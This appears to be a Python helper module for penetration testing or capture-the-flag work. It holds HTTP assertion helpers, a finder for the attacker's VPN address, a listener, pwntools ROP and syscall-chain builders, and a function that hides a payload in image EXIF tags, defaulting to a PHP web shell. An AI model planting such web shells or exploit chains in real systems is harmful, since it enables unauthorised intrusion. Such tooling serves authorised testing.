#!/usr/bin/env python

import random
import math
import socket
import base64
import itertools
import netifaces as ni
import string
import sys
import os
import io
import json

def is_port_in_use(port):
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('127.0.0.1', port)) == 0

def get_payload_path(path):
    return os.path.realpath(os.path.join(os.path.dirname(__file__), path))

def get_address(interface={"tun0", "vpn0"}):
    if not isinstance(interface, str):
        requested = set(interface)
        available = set(ni.interfaces())
        interfaces = list(requested.intersection(available))
        interface = None if not interfaces else interfaces[0]
    
    # not found or not specified, take the first available, which is not loopback
    if not interface in ni.interfaces():
        interfaces = ni.interfaces()
        interfaces.remove('lo')
        interface = interfaces[0]

    addresses = ni.ifaddresses(interface)
    addresses = [addresses[ni.AF_INET][i]["addr"] for i in range(len(addresses[ni.AF_INET]))]
    addresses = [addr for addr in addresses if not str(addr).startswith("127")]
    return addresses[0]

def generate_random_string(length=16, charset=string.printable):
    chars = random.choices(charset, k=length)
    return "".join(chars)

def exit_with_error(res, err):
    if callable(err):
        print(err(res))
    else:
        print(err)
    exit()

def assert_status_code(res, status_code, err=None):
    if type(status_code) == int and res.status_code != status_code:
        err = f"[-] '{res.url}' returned unexpected status code {res.status_code}, expected: {status_code}" if err is None else err
        exit_with_error(res, err)
    elif hasattr(status_code, '__iter__') and res.status_code not in status_code:
        err = f"[-] '{res.url}' returned unexpected status code {res.status_code}, expected one of: {','.join(status_code)}" if err is None else err
        exit_with_error(res, err)

def assert_location(res, location, err=None):
    assert_header_present(res, "Location")
    location_header = res.headers["Location"].lower()
    if location_header == location.lower():
        return

    err = f"[-] '{res.url}' returned unexpected location {location_header}, expected: {location}" if err is None else err
    exit_with_error(res, err)

def assert_content_type(res, content_type, err=None):
    assert_header_present(res, "Content-Type")
    content_type_header = res.headers["Content-Type"].lower()
    if content_type_header == content_type.lower():
        return
    if content_type_header.lower().startswith(content_type.lower() + ";"):
        return

    err = f"[-] '{res.url}' returned unexpected content type {content_type_header}, expected: {content_type}" if err is None else err
    exit_with_error(res, err)

def assert_header_present(res, header, err=None):
    if header in res.headers:
        return
        
    err = f"[-] '{res.url}' did not return header: {header}" if err is None else err
    exit_with_error(res, err)

def assert_empty(res, err=None):
    if not res.content or len(res.content) == 0:
        return

    err = f"[-] '{res.url}' returned unexpected data" if err is None else err
    exit_with_error(res, err)

def assert_not_empty(res, err=None):
    if len(res.content) > 0:
        return

    err = f"[-] '{res.url}' did not return any data" if err is None else err
    exit_with_error(res, err)

def assert_json_path(res, path, value, err=None):
    assert_content_type(res, "application/json")
    assert_not_empty(res)

    json_data = json.loads(res.text)
    for key in filter(None, path.split(".")):
        json_data = json_data[key]

    if json_data == value:
        return

    err = f"[-] '{res.url}' value at path '{path}' does not match. got={json_data} expected={value}" if err is None else err
    exit_with_error(res, err)

def open_server(address, ports=None, retry=True):
    listen_port = None
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while retry:

        if isinstance(ports, int):
            listen_port = ports
            retry = False
        elif isinstance(ports, range):
            listen_port = random.randint(ports[0], ports[-1])
        elif ports is None:
            listen_port = random.randint(10000,65535)

        try:
            sock.bind((address, listen_port))
            sock.listen(1)
            return sock
        except Exception as e:
            if not retry:
                print("[-] Unable to listen on port %d: %s" % (listenPort, str(e)))
            raise e

class Stack:
    def __init__(self, startAddress):
        self.buffer = b""
        self.address = startAddress

    def pushString(self, data):
        addr = self.address
        data = pad(data.encode() + b"\x00", 8)
        self.buffer += data
        self.address += len(data)
        return addr

    def pushAddr(self, addr):
        ptr = self.address
        data = p64(addr)
        self.buffer += data
        self.address += len(data)
        return ptr

    def pushArray(self, arr):
        addresses = []
        for arg in arr:
            arg_addr = self.pushString(arg)
            addresses.append(arg_addr)
        addresses.append(0x0)

        addr = self.address
        for arg_addr in addresses:
            self.pushAddr(arg_addr)

        return addr

def setRegisters(elf, registers):
    from pwn import ROP
    rop = ROP(elf)
    for t in rop.setRegisters(registers):
        value = t[0]
        gadget = t[1]
        if type(gadget) == pwnlib.rop.gadgets.Gadget:
            rop.raw(gadget.address)
            for reg in gadget.regs:
                if reg in registers:
                    rop.raw(registers[reg])
                else:
                    rop.raw(0)
    return rop

def genSyscall(elf, syscall, registers):
    registers["rax"] = syscall
    rop = setRegisters(elf, registers)
    syscall_gadget = "syscall" if elf.arch == "amd64" else "int 0x80"
    rop.raw(rop.find_gadget([syscall_gadget]).address)
    return rop

def pad(x, n, b=b"\x00"):
    if len(x) % n != 0:
        x  += (n-(len(x)%n))*b
    return x

def xor(a, b):
    if len(a) == 0 or len(b) == 0:
        return a

    if len(a) < len(b):
        a *= int(math.ceil((len(b)/len(a))))
        a = a[0:len(b)]
    elif len(b) < len(a):
        b *= int(math.ceil((len(a)/len(b))))
        b = b[0:len(a)]

    if type(a) == str and type(b) == str:
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(a, b) ])
    else:
        if type(a) != bytes:
            a = a.encode()
        if type(b) != bytes:
            b = b.encode()

        

    return b"".join([bytes([c1 ^ c2]) for (c1,c2) in zip(a, b) ])

def base64urldecode(data):
    return base64.urlsafe_b64decode(data + b'=' * (4 - len(data) % 4))

def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None, _format=None):
    import exif
    from PIL import Image

    if _in is None or (isinstance(_in, str) and not os.path.exists(_in)):
        _in = Image.new("RGB", (50,50), (255,255,255))

    if isinstance(_in, str):
        with open(_in, "rb") as f:
            _in = exif.Image(f)
    elif isinstance(_in, Image.Image):
        bytes = io.BytesIO()
        format = _format
        if format is None:
            format = _in.format
        if format is None:
            print("Image format not specified, use PNG/JPG/...")
            exit()
        elif format == "PNG":
            print("Image PNG not supported yet :/")
            exit()

        _in.save(bytes, format=format)
        print(bytes)
        _in = exif.Image(bytes.getvalue())
    elif not isinstance(_in, exif.Image):
        print("Invalid input. Either give an Image or a path to an image.")
        exit()

    valid_tags = list(exif._constants.ATTRIBUTE_NAME_MAP.values())
    if exif_tag is None:
        _in.image_description = payload
    elif exif_tag == "all":
        for exif_tag in valid_tags:
            try:
                print("Setting exif tag:", exif_tag)
                _in.set(exif_tag, payload)
            except Exception as e:
                print("Error setting exif tag:", exif_tag, str(e))
                pass
    else:
        if exif_tag not in valid_tags:
            print("Invalid exif-tag. Choose one of the following:")
            print(", ".join(valid_tags))
            exit()

        _in.set(exif_tag, payload)
        

    if _out is None:
        return _in.get_file()
    elif isinstance(_out, str):
        with open(_out, "wb") as f:
            f.write(_in.get_file())
    elif hasattr(_out, "write"):
        _out.write(_in.get_file())
    else:
        print("Invalid output argument.")


def human_readable_size(value):
    index = 0
    suffixes = ["B", "KiB", "MiB", "GiB", "TiB"]
    while value >= 1024:
        if index >= len(suffixes) - 1:
            break
        value /= 1024.0
        index += 1

    return "%.2f %s" % (value, suffixes[index])


class CaseInsensitiveDict(dict):

    """Basic case-insensitive dict with strings only keys."""

    proxy = {}

    def __init__(self, data=None):
        super().__init__()
        if data:
            self.proxy = dict((k.lower(), k) for k in data)
            for k in data:
                self[k] = data[k]
        else:
            self.proxy = dict()

    def __contains__(self, k):
        return k.lower() in self.proxy

    def __delitem__(self, k):
        key = self.proxy[k.lower()]
        super(CaseInsensitiveDict, self).__delitem__(key)
        del self.proxy[k.lower()]

    def __getitem__(self, k):
        key = self.proxy[k.lower()]
        return super(CaseInsensitiveDict, self).__getitem__(key)

    def get(self, k, default=None):
        return self[k] if k in self else default

    def __setitem__(self, k, v):
        super(CaseInsensitiveDict, self).__setitem__(k, v)
        self.proxy[k.lower()] = k

    @staticmethod
    def build(labels, data):
        row = CaseInsensitiveDict()
        for key, val in zip(labels, data):
            row[key] = val
        return row


if __name__ == "__main__":
    bin = sys.argv[0]
    if len(sys.argv) < 2:
        print("Usage: %s [command]" % bin)
        exit(1)

    command = sys.argv[1]
    if command == "getAddress":
        if len(sys.argv) >= 3:
            print(get_address(sys.argv[2]))
        else:
            print(get_address())
    elif command == "pad":
        if len(sys.argv) >= 3:
            n = 8
            if len(sys.argv) >= 4:
                n = int(sys.argv[3])
            print(pad(sys.argv[2].encode(), n))
        else:
            print("Usage: %s pad <str> [n=8]" % bin)
    elif command == "exifImage":
        if len(sys.argv) < 4:
            print("Usage: %s exifImage <file> <payload> [tag]" % bin)
        else:
            _in = sys.argv[2]
            payload = sys.argv[3]
            if payload == "-":
                payload = sys.stdin.readlines()

            tag = None if len(sys.argv) < 5 else sys.argv[4]
            _out = _in.split(".")
            if len(_out) == 1:
                _out = _in + "_exif"
            else:
                _out = ".".join(_out[0:-1]) + "_exif." + _out[-1]

            set_exif_data(payload, _in, _out, tag)
    else:
        print("Usage: %s [command]" % bin)
        print("Available commands:")
        print("   help, getAddress, pad, exifImage")
